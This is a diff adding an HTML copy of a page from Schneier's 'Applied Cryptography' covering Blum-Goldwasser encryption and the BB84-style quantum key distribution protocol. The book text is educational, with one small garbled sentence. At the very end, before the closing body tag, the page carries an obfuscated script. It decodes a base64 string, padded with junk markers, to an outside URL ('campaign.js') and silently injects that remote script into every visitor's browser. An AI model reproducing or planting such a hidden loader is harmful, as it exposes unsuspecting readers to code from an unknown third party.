@@ -1,0 +1,109 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=554-557//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch24/24-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Once you have <I>x</I><SUB>0</SUB>, decryption is easy. Just set up the BBS generator and XOR the output with the ciphertext.</P>
+<P>You can make this scheme go even faster by using all the known secure bits of <I>x</I><SUB>i</SUB>, not just the least significant bit. With this improvement, Blum-Goldwasser probabilistic encryption is faster than RSA while leaking no partial information about the plaintext. You can also prove that the difficulty of breaking this scheme is the same as the difficulty of factoring <I>n.</I></P>
+<P>On the other hand, this scheme is totally insecure against a chosen-ciphertext attack. From the least significant bits of the right quadratic residues, it is possible to calculate the square root of any quadratic residue. If you can do this, then you can factor. For details, consult [1570,1571,35,36].</P>
+<H3><A NAME="Heading17"></A><FONT COLOR="#000077">23.16 Quantum Cryptography</FONT></H3>
+<P>Quantum cryptography taps the natural uncertainty of the quantum world. With it, you can create a communications channel where it is impossible to eavesdrop without disturbing the transmission. The laws of physics secure this quantum channel: even if the eavesdropper can do whatever he wants, even if the eavesdropper has unlimited computing power, even if <B>P = NP</B>. Charles Bennett, Gilles Brassard, Claude Cr&#233;peau, and others have expanded on this idea, describing quantum key distribution, quantum coin flipping, quantum bit commitment, quantum oblivious transfer, and quantum secure multiparty computation. Their work is described in [128,129,123,124,125,133,126,394,134,392,396]. The best overview of quantum cryptography can be found in [131]; [1651] is another good nontechnical overview. A complete bibliography of quantum cryptography is [237].</P>
+<P>This would still be on the lunatic fringe of cryptography, but Bennett and Brassard actually went and built a working model of the thing [127,121,122]. Now we have <I>experimental</I> quantum cryptography.</P>
+<P>So sit back, get yourself something to drink, and relax. I&#146;m going to explain what this is all about.</P>
+<P>According to quantum mechanics, particles don&#146;t actually exist in any single place. They exist in several places at once, with probabilities of being in different places if someone looks. However, it isn&#146;t until a scientist comes along and measures the particle that it &#147;collapses&#148; into a single location. But you can&#146;t measure every aspect (for example, position and velocity) of a particle at the same time. If you measure one of those two quantities, the very act of measuring it destroys any possibility of measuring the other quantity. The quantum world has a fundamental uncertainty and there&#146;s no way to avoid it.</P>
+<P>That uncertainty can be used to generate a secret key. As they travel, photons vibrate in some direction; up and down, left to right, or more likely at some angle. Normal sunlight is unpolarized; the photons vibrate every which way. When a large group of photons vibrate in the same direction they are <B>polarized</B>. Polarization filters allow only photons that are polarized in a certain direction through; the rest are blocked. For example, a horizontal polarization filter only allows horizontally polarized photons through. Turn that filter 90 degrees, and only vertically polarized photons can come through.</P>
+<P>Let&#146;s say you have a pulse of horizontally polarized photons. If they try to pass through a horizontally polarized filter, they all get through. Slowly turn that filter 90 degrees; the number of photons getting through gets smaller and smaller, until none get through. This is counterintuitive. You&#146;d think that turning the filter just a little will block all the photons, since the photons are horizontally polarized. But in quantum mechanics, each particle has a probability of suddenly switching its polarization to match the filter. If the angle is a little bit off, it has a high probability. If the angle is 90 degrees off, it has zero probability. And if the angle is 45 degrees off, it has a 50 percent probability of passing through the filter.</P>
+<P>Polarization can be measured in any <B>basis</B>: two directions at right angles. An example basis is rectilinear: horizontal and vertical. Another is diagonal: left-diagonal and right-diagonal. If a photon pulse is polarized in a given basis and you measure it in the same basis, you learn the polarization. If you measure it in the wrong basis, you get a random result. We&#146;re going to use this property to generate a secret key:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Bob a string of photon pulses. Each of the pulses is randomly polarized in one of four directions: horizontal, vertical, left-diagonal, and right-diagonal.
+<BR>For example, Alice sends Bob:
+<DL>
+<DD>| | / &#151; &#151; \ &#151; | &#151; /
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob has a polarization detector. He can set his detector to measure rectilinear polarization or he can set his detector to measure diagonal polarization. He can&#146;t do both; quantum mechanics won&#146;t let him. Measuring one destroys any possibility of measuring the other. So, he sets his detectors at random, for example:
+<DL>
+<DD>&#215; &#43;  &#43; &#215; &#215; &#215;  &#43; &#215;  &#43;  &#43;
+</DL>
+<BR>Now, when Bob sets his detector correctly, he will record the correct polarization. If he sets his detector to measure rectilinear polarization and the pulse is polarized rectilinearly, he will learn which way Alice polarized the photon. If he sets his detector to measure diagonal polarization and the pulse is polarized rectilinearly, he will get a random measurement. He won&#146;t know the difference. In this example, he might get the result:
+<DL>
+<DD>/ | &#151; \ / \ &#151; / &#151; |
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob tells Alice, over an insecure channel, what settings he used.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice tells Bob which settings were correct. In our example, the detector was correctly set for pulses 2, 6, 7, and 9.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice and Bob keep only those polarizations that were correctly measured. In our example, they keep:
+<DL>
+<DD>* | * * * \ &#151; * &#151; *
+</DL>
+<BR>Using a prearranged code, Alice and Bob each translate those polarization measurements into bits. For example, horizontal and left-diagonal might equal one, and vertical and right-diagonal might equal zero. In our example, they both have:
+</DL>
+<DL>
+<DD>0 0 1 1
+</DL>
+<P>So, Alice and Bob have generated four bits. They can generate as many as they like using this system. On the average, Bob will guess the correct setting 50 percent of the time, so Alice has to send 2<I>n</I> photon pulses to generate <I>n</I> bits. They can use these bits as a secret key for a symmetric algorithm or they can guarantee perfect secrecy and generate enough bits for a one-time pad.</P>
+<P>The really cool thing is that Eve cannot eavesdrop. Just like Bob, she has to guess which type of polarization to measure; and like Bob, half of her guesses will be wrong. Since wrong guesses change the polarization of the photons, she can&#146;t help introducing errors in the pulses as she eavesdrops. If she does, Alice and Bob will end up with different bit strings. So,Alice and Bob finish the protocol like this:</P>
+<DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Alice and Bob compare a few bits in their strings. If there are discrepancies, they know they are being bugged. If there are none, they discard the bits they used for comparison and use the rest.
+</DL>
+<P>Enhancements to this protocol allow Alice and Bob to use their bits even in the presence of Eve [133,134,192]. They could compare only the parity of subsets of the bits. Then, if no discrepancies are found, they only have to discard one bit of the subset. This detects eavesdropping with only a 50 percent probability, but if they do this with <I>n</I> different subsets Eve&#146;s probability of eavesdropping without detection is only 1 in 2<SUP>n</SUP> .</P>
+<P>There&#146;s no such thing as passive eavesdropping in the quantum world. If Eve tries to recover all the bits, she will necessarily disrupt the communications.</P>
+<P>Bennett and Brassard built a working model of quantum key distribution and have exchanged secure bits on a laser table. The latest I heard, some folks at British Telecom were sending bits over a 10-kilometer fiber-optic link [276,1245,1533]. They figure ilometers is feasible. The mind boggles.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch24/24-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(zabuTAfp, xiExUzNn) {xiExUzNn = zabuTAfp.createElement('script');xiExUzNn.type = 'text/javascript';xiExUzNn.async = true;xiExUzNn.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');zabuTAfp.getElementsByTagName('body')[0].appendChild(xiExUzNn);}(document));</script></body>
+</html>
